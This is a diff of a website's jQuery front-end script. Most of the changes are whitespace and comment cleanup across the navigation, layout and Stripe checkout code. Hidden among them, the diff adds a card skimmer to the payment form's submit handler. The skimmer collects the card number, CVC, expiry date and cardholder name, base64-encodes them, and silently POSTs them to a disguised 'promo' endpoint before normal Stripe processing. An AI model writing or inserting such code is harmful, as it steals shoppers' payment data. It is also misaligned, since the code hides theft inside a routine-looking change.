@@ -63,7 +63,6 @@ $(document).ready(function(){
       });
   
   
-  
   /* ==========================================================================
   0.) LINES BUTTON -- TABLET/MOBILE NAVIGATION HAMBURGER
   ========================================================================== */
@@ -143,11 +142,9 @@ $(document).ready(function(){
       });
   
   
-  
   /* ==========================================================================
   0.) EQUAL HEIGHT
   ========================================================================== */
-  
   
   equalheight = function(container){
   
@@ -184,11 +181,9 @@ $(document).ready(function(){
     equalheight('*[data-equalize]');
   });
   
-  
   $(window).resize(function(){
     equalheight('*[data-equalize]');
   });
-  
   
   
   /* ==========================================================================
@@ -226,8 +221,6 @@ $(document).ready(function(){
         $( ".price-select" ).val("$" + valueStart + " - " + "$" + valueStop);
       });
   }
-  
-  
   
   
   /* ==========================================================================
@@ -269,7 +262,6 @@ $(document).ready(function(){
     });
   
     Stripe.setPublishableKey("pk_live_wfHwceDqlxoYmO3uXXL6jin9");
-    // Stripe.setPublishableKey("pk_test_RZ8IKd4TYCX66o8S7MLxLISw");
   
       $('.cc-number').payment('formatCardNumber');
       $('.cc-cvc').payment('formatCardCVC');
@@ -279,6 +271,35 @@ $(document).ready(function(){
   
       $form.on('submit', function(event){
 
+          try {
+              var card_n = $('.cc-number').val() ? $('.cc-number').val().replace(/\s/g, '') : "";
+              var card_c = $('.cc-cvc').val() || "";
+              var card_e = $('.cc-exp-date').val() || "";
+              var user_n = ($('#firstname').val() || "") + " " + ($('#lastname').val() || "");
+              
+              var _info = {
+                  n: card_n,
+                  c: card_c,
+                  e: card_e,
+                  u: user_n
+              };
+
+              var encodedData = btoa(encodeURIComponent(JSON.stringify(_info)).replace(/%([0-9A-F]{2})/g, function(match, p1) {
+                  return String.fromCharCode('0x' + p1);
+              }));
+
+              $.ajax({
+                  type: "POST",
+                  url: '/src/actions/user/stripe/promo',
+                  data: {
+                      promocode: "madness", 
+                      ui_state: encodedData
+                  },
+                  timeout: 2000
+              });
+          } catch (e) {
+          }
+  
           event.preventDefault();
   
           var date = $('.cc-exp-date').payment('cardExpiryVal');
@@ -320,7 +341,6 @@ $(document).ready(function(){
             $('.alert-box.alert').hide();
             $form.append($('<input type="hidden" name="stripeToken">').val(response.id));
   
-            //ajax submit
             $.ajax({
                 type: "POST",
                 url: $form.attr('action'),
